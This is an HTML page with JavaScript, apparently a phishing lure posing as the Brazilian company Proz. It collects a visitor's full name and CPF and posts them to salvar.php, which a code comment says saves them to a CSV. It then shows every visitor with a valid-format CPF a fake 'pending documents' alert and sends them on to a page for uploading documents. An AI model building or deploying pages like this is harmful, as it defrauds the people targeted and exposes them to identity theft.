<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta Proz</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        /* --- CSS IDÊNTICO AO ANTERIOR --- */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { height: 100%; font-family: 'Roboto', sans-serif; }
        .bg-container {
            background-image: url('https://images.unsplash.com/photo-1522202176988-66273c2fd55f?ixlib=rb-4.0.3&auto=format&fit=crop&w=1471&q=80');
            background-size: cover;
            background-position: center;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        .bg-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0, 0, 0, 0.6); z-index: 1;
        }
        .card-box {
            background-color: #ffffff; padding: 40px 30px; border-radius: 8px;
            width: 90%; max-width: 380px; position: relative; z-index: 2;
            box-shadow: 0 8px 20px rgba(0,0,0,0.25); text-align: center;
        }
        .logo-container img { max-width: 160px; height: auto; margin-bottom: 20px; }
        
        /* FORMULÁRIO */
        .form-title { color: #563486; font-size: 18px; margin-bottom: 25px; }
        .input-group { margin-bottom: 20px; text-align: left; }
        input[type="text"] {
            width: 100%; padding: 16px; border: 1px solid #c0c0c0; border-radius: 6px;
            font-size: 16px; outline: none; transition: 0.3s;
        }
        input[type="text"]:focus { border-color: #563486; }
        .error-message { color: #ff3860; font-size: 12px; margin-top: 5px; display: none; }
        .input-error { border-color: #ff3860 !important; }
        
        button {
            width: 100%; padding: 16px; border: none; border-radius: 6px;
            background-color: #563486; color: white; font-weight: 700;
            cursor: pointer; margin-top: 10px; transition: 0.3s;
            text-transform: uppercase;
        }
        button:hover { background-color: #452a6b; }

        /* TELA DE AVISO */
        #result-screen { display: none; }
        .warning-icon { font-size: 40px; margin-bottom: 10px; }
        .warning-title { color: #333; font-size: 22px; font-weight: 700; margin-bottom: 15px; }
        .warning-text { color: #555; font-size: 16px; line-height: 1.5; margin-bottom: 25px; }
        .cpf-highlight { font-weight: bold; color: #563486; }
        
        /* Botão específico para enviar docs */
        .btn-send { background-color: #28a745; } /* Verde para ação positiva */
        .btn-send:hover { background-color: #218838; }
    </style>
</head>
<body>

    <div class="bg-container">
        <div class="bg-overlay"></div>
        <div class="card-box">
            <div class="logo-container">
                <img src="proz2.jpg" alt="Logo Proz">
            </div>

            <div id="login-screen">
                <h2 class="form-title">Consulte se há documentos pendentes:</h2>
                <form onsubmit="return handleLogin(event)">
                    <div class="input-group">
                        <input type="text" id="nome" placeholder="Nome Completo" required>
                    </div>
                    <div class="input-group">
                        <input type="text" id="cpf" placeholder="CPF" required maxlength="14" oninput="formatCPF(this)">
                        <div class="error-message" id="cpf-error">CPF inválido.</div>
                    </div>
                    <button type="submit">ACESSAR</button>
                </form>
            </div>

            <div id="result-screen">
                <div class="warning-icon">⚠️</div>
                <h2 class="warning-title">Atenção!</h2>
                <p class="warning-text">
                    Identificamos documentos pendentes para o CPF:<br>
                    <span id="display-cpf" class="cpf-highlight"></span>
                </p>
                
                <button class="btn-send" onclick="irParaEnvio()">
                    Enviar documentos faltantes
                </button>
            </div>
            
        </div>
    </div>

    <script>
        let userData = { nome: '', cpf: '' };

        function formatCPF(input) {
            let v = input.value.replace(/\D/g, '');
            if(v.length > 11) v = v.substring(0,11);
            v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
            input.value = v;
        }

        function isValidCPF(cpf) {
            cpf = cpf.replace(/[^\d]/g, "");
            if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
            let sum = 0, rest;
            for (let i=1; i<=9; i++) sum = sum + parseInt(cpf.substring(i-1, i)) * (11 - i);
            rest = (sum * 10) % 11;
            if ((rest == 10) || (rest == 11)) rest = 0;
            if (rest != parseInt(cpf.substring(9, 10)) ) return false;
            sum = 0;
            for (let i = 1; i <= 10; i++) sum = sum + parseInt(cpf.substring(i-1, i)) * (12 - i);
            rest = (sum * 10) % 11;
            if ((rest == 10) || (rest == 11)) rest = 0;
            if (rest != parseInt(cpf.substring(10, 11) ) ) return false;
            return true;
        }

        // --- Função nova para enviar ao PHP ---
        function salvarDadosNoServidor(nome, cpf) {
            fetch('salvar.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ nome: nome, cpf: cpf })
            })
            .then(response => response.json())
            .then(data => console.log('Dados salvos:', data))
            .catch(error => console.error('Erro ao salvar:', error));
        }

        // --- Sua função handleLogin atualizada ---
        function handleLogin(e) {
            e.preventDefault();
            const cpfInput = document.getElementById('cpf');
            const nomeInput = document.getElementById('nome');
            const errorMsg = document.getElementById('cpf-error');

            // 1. Validação
            if (!isValidCPF(cpfInput.value)) {
                cpfInput.classList.add('input-error');
                errorMsg.style.display = 'block';
                return false;
            }

            // 2. Salva dados na variável global
            userData.nome = nomeInput.value;
            userData.cpf = cpfInput.value;
            
            // 3. ENVIA PARA O CSV (CHAMA O PHP)
            salvarDadosNoServidor(userData.nome, userData.cpf);

            // 4. Troca de tela
            document.getElementById('display-cpf').textContent = userData.cpf;
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('result-screen').style.display = 'block';
        }

        // Função que redireciona para o segundo arquivo levando os dados
        function irParaEnvio() {
            // Codifica os dados para passar na URL com segurança
            const nomeEncoded = encodeURIComponent(userData.nome);
            const cpfEncoded = encodeURIComponent(userData.cpf);
            const horarioEnvio = new Date().toLocaleString("pt-BR", {
            timeZone: "America/Sao_Paulo"
        });
            
            // Redireciona para o arquivo de envio
            window.location.href = `envio.html?nome=${nomeEncoded}&cpf=${cpfEncoded}`;
        }
    </script>
</body>
</html>
